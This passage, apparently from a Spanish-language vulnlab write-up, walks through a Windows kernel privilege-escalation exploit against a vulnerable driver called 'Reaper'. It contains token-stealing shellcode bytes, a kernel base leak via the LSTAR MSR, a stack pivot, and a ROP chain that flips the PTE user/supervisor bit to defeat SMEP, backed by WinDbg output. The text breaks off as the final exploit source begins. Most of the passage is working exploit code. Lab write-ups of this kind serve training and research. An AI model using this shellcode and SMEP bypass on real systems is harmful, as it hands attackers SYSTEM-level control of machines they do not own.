    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID</span><span class="p">
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token</span><span class="p">
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS  </span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8d</span><span class="p">,</span><span class="mi"> 0x62</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                               // lea rsp, [rdx - 0x18]            ; clear stack</span><span class="p">
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return</span><span class="p">
};

</span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(tokenStealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
RtlCopyMemory(shellcode, tokenStealing, </span><span class="o">sizeof</span><span class="p">(tokenStealing));</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo debido a la protección <code class="language-plaintext highlighter-rouge">SMEP</code> no podemos retornar a una dirección en memoria de usuario, para ello necesitamos hacer <code class="language-plaintext highlighter-rouge">rop</code> y para ello la base del kernel, lo mas sencillo seria usar <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code> pero esto solo funciona en <code class="language-plaintext highlighter-rouge">Medium</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);  
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}</span>
</code></pre></div></div><br>

<p class="plain-text">Esto no funcionará debido a que la shell de <code class="language-plaintext highlighter-rouge">www</code> está en un nivel de integridad <code class="language-plaintext highlighter-rouge">Low</code>, por lo que no tenemos privilegios obtener la base de los módulos de esta forma</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\dev> </span><span class="am">whoami</span><span class="p"> /groups |</span><span class="am"> findstr</span><span class="p"> Label

Mandatory Label\Low Mandatory Level Label            S-1-16-4096  

C:\dev></span>
</code></pre></div></div><br>

<p class="plain-text">La lectura de registros <code class="language-plaintext highlighter-rouge">MSR</code> nos servirá en esto, el registro <a href="https://wiki.osdev.org/SYSENTER#Registers_2">LSTAR</a> siempre apunta a la dirección de la función <code class="language-plaintext highlighter-rouge">KiSystemCall64</code> que está en el módulo <code class="language-plaintext highlighter-rouge">nt</code>, si leemos su contenido y restamos el offset podemos obtener la dirección base del kernel</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> ? nt!KiSystemCall64 - nt
Evaluate expression: 4416448 = 00000000`004363c0  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#define </span><span class="na">REGISTER_LSTAR</span><span class="mi"> 0xC0000082
</span><span class="o">#define</span><span class="na"> OFFSET_KiSystemCall64</span><span class="mi"> 0x4363c0  </span>
</code></pre></div></div><br>

<p class="plain-text">Para ello podemos llamar a la función <code class="language-plaintext highlighter-rouge">ReadMSR</code> para leer el contenido del registro <code class="language-plaintext highlighter-rouge">LSTAR</code>, restamos el offset y esto nos permite mostrar la dirección base del kernel</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (hDevice</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> KiSystemCall64</span><span class="o"> =</span><span class="p"> ReadMSR(hDevice, REGISTER_LSTAR);
    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> KiSystemCall64</span><span class="o"> -</span><span class="p"> OFFSET_KiSystemCall64;
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Kenel Base: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, kernelBase);

    CloseHandle(hDevice);
}</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\user\Desktop> </span><span class="am">.\exploit.exe</span><span class="p">  
[*] Kenel Base: 0xfffff80630808000
PS C:\Users\user\Desktop></span>
</code></pre></div></div><br>

<p class="plain-text">Con la dirección base del kernel ya podemos armar una cadena <code class="language-plaintext highlighter-rouge">rop</code> pero para ejecutarla necesitamos controlar el stack, podemos ejecutar un stack pivot en la dirección que ejecutamos que retorne a un espacio en memoria de user mode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper</span><span class="p"> --file ntoskrnl.exe --console
</span><span class="ve">[INFO]</span><span class="p"> Load gadgets from cache
</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span><span class="p"> search mov esp, 0x48000000;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov esp, 0x48000000;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x00000000003739b0</span><span class="p">:</span><span class="am"> mov</span><span class="p"> esp, 0x48000000</span><span class="az">; </span><span class="am">add</span><span class="p"> esp, 0x28</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span><span class="p">  

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos un lugar a donde retornar usamos <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> para reservar un espacio en memoria de usuario donde escribiremos algunos qwords, luego usamos <code class="language-plaintext highlighter-rouge">VirtualLock</code> para bloquearlo evitando un <code class="language-plaintext highlighter-rouge">BSOD</code> y ejecutamos el stack pivot</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (hDevice</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> KiSystemCall64</span><span class="o"> =</span><span class="p"> ReadMSR(hDevice, REGISTER_LSTAR);
    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> KiSystemCall64</span><span class="o"> -</span><span class="p"> OFFSET_KiSystemCall64;

    </span><span class="na">LPVOID </span><span class="p">pivot </span><span class="o">=</span><span class="p"> VirtualAlloc((</span><span class="na">LPVOID</span><span class="p">) (</span><span class="mi">0x48000000</span><span class="o"> -</span><span class="mi"> 0x1000</span><span class="p">), </span><span class="mi">0x10000</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_READWRITE);  
    VirtualLock(pivot,</span><span class="mi"> 0x10000</span><span class="p">);

    </span><span class="na">QWORD</span><span class="o"> *</span><span class="p">rop</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">QWORD</span><span class="p">) </span><span class="mi">0x48000000</span><span class="o"> +</span><span class="mi"> 0x28</span><span class="p">);
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="mi"> 0x4141414141414141</span><span class="p">;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="mi"> 0x4242424242424242</span><span class="p">;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="mi"> 0x4343434343434343</span><span class="p">;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="mi"> 0x4444444444444444</span><span class="p">;

    ExecuteAddress(hDevice, kernelBase</span><span class="o"> +</span><span class="mi"> 0x3739b0</span><span class="p">);</span><span class="c1"> // mov esp, 0x48000000; add esp, 0x28; ret;</span><span class="p">
    CloseHandle(hDevice);
}</span>
</code></pre></div></div><br>

<p class="plain-text">Establecemos un breakpoint en el gadget del pivot, al llegar ahí y avanzar hasta el <code class="language-plaintext highlighter-rouge">ret</code> el registro <code class="language-plaintext highlighter-rouge">rsp</code> deberia apuntar a memoria de usuario en <code class="language-plaintext highlighter-rouge">0x48000028</code> y al retornar lo hará a los qwords que escribimos, podemos escribir un <code class="language-plaintext highlighter-rouge">ropchain</code> ahí</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> bp nt + 0x2c45c0

</span><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
nt!ExfReleasePushLock+0x20:
fffff805`0d6d55c0 bc00000048      mov     esp,48000000h  

</span><span class="ro">0: kd></span><span class="p"> pt
nt!ExfReleasePushLock+0x28:
fffff805`0d6d55c8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> r rsp
rsp=0000000048000028

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L4
00000000`48000028  41414141`41414141
00000000`48000030  42424242`42424242
00000000`48000038  43434343`43434343
00000000`48000040  44444444`44444444</span>
</code></pre></div></div><br>

<p class="plain-text">La protección <code class="language-plaintext highlighter-rouge">SMEP</code> evita que se pueda ejecutar memoria en espacio de usuario, el que esté activo se controla desde el bit <code class="language-plaintext highlighter-rouge">20</code> del registro <code class="language-plaintext highlighter-rouge">cr4</code>, podriamos modificar su valor y deshabilitarlo pero el <code class="language-plaintext highlighter-rouge">PatchGuard</code> será un problema si no se restaura</p>
<a href="/vulnlab/reaper2/16.png" target="_blank"><div><p><img src="/vulnlab/reaper2/16.png"></p></div></a>

<p class="plain-text">Algo a tener en cuenta es <code class="language-plaintext highlighter-rouge">SMEP</code> solo funciona cuando la página es marcada como espacio de usuario, si el bit <code class="language-plaintext highlighter-rouge">2</code> o <code class="language-plaintext highlighter-rouge">U/S</code> de la <code class="language-plaintext highlighter-rouge">PTE</code> esta deshabilitado tratará la página como memoria de kernel por lo que ni siquiera deberia molestarse en verificarlo</p>
<a href="/vulnlab/reaper2/18.png" target="_blank"><div><p><img src="/vulnlab/reaper2/18.png"></p></div></a>

<p class="plain-text">Para obtener la <code class="language-plaintext highlighter-rouge">PTE</code> de la página donde se encuentra el shellcode podemos usar la función <code class="language-plaintext highlighter-rouge">MiGetPteAddress</code> que se encuentra en el offset <code class="language-plaintext highlighter-rouge">0x31e2c4</code> a partir de <code class="language-plaintext highlighter-rouge">nt</code></p>
<a href="/vulnlab/reaper2/14.png" target="_blank"><div><p><img src="/vulnlab/reaper2/14.png"></p></div></a>

<p class="plain-text">Guardamos en el registro <code class="language-plaintext highlighter-rouge">rcx</code> el argumento para <code class="language-plaintext highlighter-rouge">GetMiPteAddress</code> la dirección de la memoria reservada para el shellcode, esto retornará la <code class="language-plaintext highlighter-rouge">PTE</code> de esa página</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase </span><span class="o">+</span><span class="mi"> 0x2084f6</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x31e2c4</span><span class="c1">; // MiGetPteAddress  </span>
</code></pre></div></div><br>

<p class="plain-text">Como estamos modificando las tablas de paginación, usaremos el gadget <code class="language-plaintext highlighter-rouge">wbinvd</code> para invalidar las <code class="language-plaintext highlighter-rouge">TLB</code> y carga de nuevo las tablas evitando asi un posible <code class="language-plaintext highlighter-rouge">BSOD</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x38b490</span><span class="p">;</span><span class="c1"> // wbinvd; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing  </span>
</code></pre></div></div><br>

<p class="plain-text">Establecemos un breakpoint luego de la llamada en el <code class="language-plaintext highlighter-rouge">wbinvd; ret;</code> luego de este gadget en el stack deberia encontrarse el qword de nuestro shellcode a ejecutar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> bp nt + 0x386660

</span><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
nt!HalpAcpiFlushCache:
fffff806`23b86660 0f09            wbinvd

</span><span class="ro">0: kd></span><span class="p"> u poi(rsp)
0000027a`5b850000 65488b042588010000 mov     rax,qword ptr gs:[188h]
0000027a`5b850009 488b80b8000000     mov     rax,qword ptr [rax+0B8h]  
0000027a`5b850010 50                 push    rax
0000027a`5b850011 5b                 pop     rbx
0000027a`5b850012 488b9b48040000     mov     rbx,qword ptr [rbx+448h]  
0000027a`5b850019 4881eb48040000     sub     rbx,448h
0000027a`5b850020 4883bb4004000004   cmp     qword ptr [rbx+440h],4
0000027a`5b850028 75e8               jne     0000027a`5b850012</span>
</code></pre></div></div><br>

<p class="plain-text">El valor de retorno en <code class="language-plaintext highlighter-rouge">rax</code> de la función es la dirección de la <code class="language-plaintext highlighter-rouge">PTE</code> de esa página, podemos ver una <code class="language-plaintext highlighter-rouge">U</code> que indica que la página pertenece a un espacio de usuario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs rax L1
ffffb981`3d2dc280  00000000`a5ad5867

</span><span class="ro">0: kd></span><span class="p"> !pte poi(rsp)
                                           VA 0000027a5b850000
PXE at FFFFB9DCEE773020    PPE at FFFFB9DCEE604F48    PDE at FFFFB9DCC09E96E0    PTE at FFFFB9813D2DC280
contains 0A000000A065F867  contains 0A000000A3A60867  contains 0A000000A377E867  contains 00000000A5AD5867
pfn a065f     ---DA--UWEV  pfn a3a60     ---DA--UWEV  pfn a377e     ---DA--UWEV  pfn a5ad5     ---DA--UWEV  </span>
</code></pre></div></div><br>

<p class="plain-text">El único byte que se mantiene constante es el <code class="language-plaintext highlighter-rouge">0x67</code>, si lo convertimos a formato binario podemos saber cuales de los <code class="language-plaintext highlighter-rouge">8</code> bits están encendidos o apagados</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> db rax L8
ffffb981`3d2dc280  67 58 ad a5 00 00 00 00                          gX......

</span><span class="ro">0:000></span><span class="p"> .formats 0x67 
Evaluate expression:
  Hex:     00000000`00000067
  Decimal: 103
  Decimal (unsigned) : 103
  Octal:   0000000000000000000147
  Binary:  00000000 00000000 00000000 00000000 00000000 00000000 00000000 01100111  
  Chars:   .......g
  Time:    Wed Dec 31 18:01:43 1969
  Float:   low 1.44334e-043 high 0
  Double:  5.08888e-322</span>
</code></pre></div></div><br>

<p class="plain-text">De los bits que están prendidos podemos ver al <code class="language-plaintext highlighter-rouge">0</code> que la página está en memoria física, el bit <code class="language-plaintext highlighter-rouge">1</code> controla los permisos de escritura, el bit <code class="language-plaintext highlighter-rouge">5</code> que la página ha sido leída y finalmente el <code class="language-plaintext highlighter-rouge">6</code> que la página ha sido escrita, en realidad nos interesa el <code class="language-plaintext highlighter-rouge">2</code></p>
<a href="/vulnlab/reaper2/17.png" target="_blank"><div><p><img src="/vulnlab/reaper2/17.png"></p></div></a>

<p class="plain-text">Si deshabiitamos el bit <code class="language-plaintext highlighter-rouge">2</code> indicará que la página no se podrá acceder desde modo de usuario sino solo por kernel, podemos ver que el byte cambia el valor a <code class="language-plaintext highlighter-rouge">0x63</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> ? 0y01100111
Evaluate expression: 103 = 00000000`00000067  

</span><span class="ro">0:000></span><span class="p"> ? 0y01100011
Evaluate expression: 99 = 00000000`00000063</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestra cadena <code class="language-plaintext highlighter-rouge">rop</code> evita la protección <code class="language-plaintext highlighter-rouge">SMEP</code> obteniendo la <code class="language-plaintext highlighter-rouge">PTE</code> de la página en donde se encuentra el shelcode, modifica el byte deshabilitando el bit <code class="language-plaintext highlighter-rouge">2</code> de <code class="language-plaintext highlighter-rouge">U/S</code>, luego sobrescribe la <code class="language-plaintext highlighter-rouge">PTE</code> con el nuevo valor, invalida la caché y salta al shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x2084f6</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x31e2c4</span><span class="p">;</span><span class="c1"> // MiGetPteAddress
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x2084f6</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="mi"> 0x63</span><span class="p">;</span><span class="c1">                  // U/S bit off (2)
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x44b611</span><span class="p">;</span><span class="c1"> // mov [rax], cl; ret;  
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x38b490</span><span class="p">;</span><span class="c1"> // wbinvd; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing</span>
</code></pre></div></div><br>

<p class="plain-text">Establecemos un breakpoint luego de la cadena <code class="language-plaintext highlighter-rouge">rop</code>, podemos ver que el primer byte de la <code class="language-plaintext highlighter-rouge">PTE</code> se ha modificado a <code class="language-plaintext highlighter-rouge">0x63</code> deshabilitando el bit <code class="language-plaintext highlighter-rouge">2</code> de <code class="language-plaintext highlighter-rouge">U/S</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> bp nt + 0x386660

</span><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
nt!HalpAcpiFlushCache:
fffff802`7cb86660 0f09            wbinvd

</span><span class="ro">0: kd></span><span class="p"> db rax L8
fffff701`49a53100  63 b8 0a 9f 00 00 00 00                          c.......  </span>
</code></pre></div></div><br>

<p class="plain-text">De esta forma ese espacio en memoria se considera memoria de kernel por lo que <code class="language-plaintext highlighter-rouge">SMEP</code> no deberia afectarnos ya que ni siquiera intentara hacer las comprobaciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !pte poi(rsp)
                                           VA 000002934a620000
PXE at FFFFF77BBDDEE028    PPE at FFFFF77BBDC05268    PDE at FFFFF77B80A4D298    PTE at FFFFF70149A53100
contains 0A0000009F03B867  contains 0A0000009F03C867  contains 0A0000009F07B867  contains 000000009F0AB863
pfn 9f03b     ---DA--UWEV  pfn 9f03c     ---DA--UWEV  pfn 9f07b     ---DA--UWEV  pfn 9f0ab     ---DA--KWEV  </span>
</code></pre></div></div><br>

<p class="plain-text">El exploit final obtiene la dirección base del kernel leyendo un registro <code class="language-plaintext highlighter-rouge">MSR</code>, luego ejecuta un stack pivot para ejecutar una cadena <code class="language-plaintext highlighter-rouge">rop</code> que evita <code class="language-plaintext highlighter-rouge">SMEP</code> modificando la <code class="language-plaintext highlighter-rouge">PTE</code> para convetirla en memoria de kernel, luego salta al shellcode que escribimos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltwindows.h>

</span><span class="o">#define</span><span class="na"> IOCTL_EXEC</span><span class="mi"> 0x8000200b
</span><span class="o">#define</span><span class="na"> IOCTL_FREE</span><span class="mi"> 0x80002007
</span><span class="o">#define</span><span class="na"> IOCTL_ALLOC</span><span class="mi"> 0x80002003
</span><span class="o">#define</span><span class="na"> IOCTL_READMSR</span><span class="mi"> 0x8000200f

</span><span class="o">#define</span><span class="na"> REGISTER_LSTAR</span><span class="mi"> 0xC0000082
</span><span class="o">#define</span><span class="na"> OFFSET_KiSystemCall64</span><span class="mi"> 0x4363c0

</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

</span><span class="no">typedef struct</span><span class="p"> ReaperData {
    </span><span class="na">DWORD</span><span class="p"> Magic;
    </span><span class="na">DWORD</span><span class="p"> ThreadId;
    </span><span class="na">DWORD</span><span class="p"> Priority;
    </span><span class="na">DWORD</span><span class="p"> Empty;
    </span><span class="na">QWORD</span><span class="p"> ExecAddress;
    </span><span class="na">DWORD</span><span class="p"> SrcRegister;
    </span><span class="na">QWORD</span><span class="p"> DstAddress;
} </span><span class="na">ReaperData</span><span class="p">;

</span><span class="na">BYTE</span><span class="p"> tokenStealing[</span><span class="mi">64</span><span class="p">] </span><span class="o">=</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rax, [gs:0x188]              ; $rax = _KTHREAD</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rax + 0xb8]            ; $rax = _EPROCESS</span><span class="p">
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS</span><span class="p">
                                                          </span><span class="c1">// .loop:</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID</span><span class="p">
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop</span><span class="p">
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token</span><span class="p">
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct</span><span class="p">
